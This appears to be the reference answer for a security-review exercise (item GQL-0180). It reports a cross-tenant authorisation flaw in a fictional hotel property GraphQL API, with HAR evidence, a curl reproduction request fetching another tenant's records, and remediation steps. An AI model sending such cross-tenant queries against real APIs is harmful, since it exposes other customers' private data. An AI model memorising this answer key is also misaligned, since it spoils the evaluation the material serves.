# Expected Response

## System
- **Domain:** Hospitality / Property Management
- **System:** StayPro Property API
- **Example ID:** GQL-0180

## Priority Findings

### Finding 1: Hospitality — BOLA via bulkResourceLookup Enables Cross-Tenant Property Data Access (Pattern 1.5)
**Severity:** High
**Category:** BOLA / Multi-Tenant / Cross-Tenant Access

**Summary:**
Per §4.0 (RISK-GQL-180): The `getResource` resolver fetches by `resourceId` only, without verifying `tenantId` ownership. Per §5.0 (Pattern 1.5 — multi-tenant/cross-tenant access): `bulkResourceLookup` returns property records across tenant boundaries when IDs from other tenants are supplied. An attacker from `tenant-567f` queried `bulkResourceLookup(ids: ["R-2180", "R-1180", "R-3180"])` and received a property record belonging to `tenant-c870`, including `CONFIDENTIAL-567fc870`. In Hospitality / Property Management, unauthorized access to booking data, guest profiles, and room rate configurations across hotel chains represents a significant competitive and privacy risk.

**Evidence from HAR:**
- Request: `POST https://api.staypro-property-api.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-567f`
- Query: `bulkResourceLookup(ids: ["R-2180", "R-1180", "R-3180"]) { resourceId tenantId data { sensitiveField } }`
- Response `200 OK`: `tenantId: "tenant-c870"`, `ownerId: "other-user-567fc870"`, `sensitiveField: "CONFIDENTIAL-567fc870"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-567fc870`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §4.0 | RISK-GQL-180 | getResource resolver lacks tenantId ownership check |
| context.txt §5.0 | Pattern 1.5 | Multi-tenant cross-tenant access via bulk lookup |
| HAR query | ids array | R-2180 cross-tenant property lookup |
| HAR response | tenantId | tenant-c870 returned to tenant-567f |
| HAR response | sensitiveField | CONFIDENTIAL-567fc870 |
| HAR header | x-request-id | req-567fc870 |

## Steps to Reproduce

### Step 1 — bulkResourceLookup multi-tenant BOLA (HAR)
```bash
curl -s -X POST https://api.staypro-property-api.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-567f" \
  -d '{"query": "query { bulkResourceLookup(ids: [\"R-2180\", \"R-1180\", \"R-3180\"]) { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable:** Returns `tenant-c870` property record including `CONFIDENTIAL-567fc870`. **Secure:** FORBIDDEN — only `tenant-567f` records returned.

## Remediation
1. Resolver: `WHERE resource_id = ANY($ids) AND tenant_id = $jwt.tenantId`.
2. Filter result set server-side: discard any record where `tenant_id != jwt.tenantId`.
3. Redis cache key: `resource:{tenantId}:{resourceId}`.
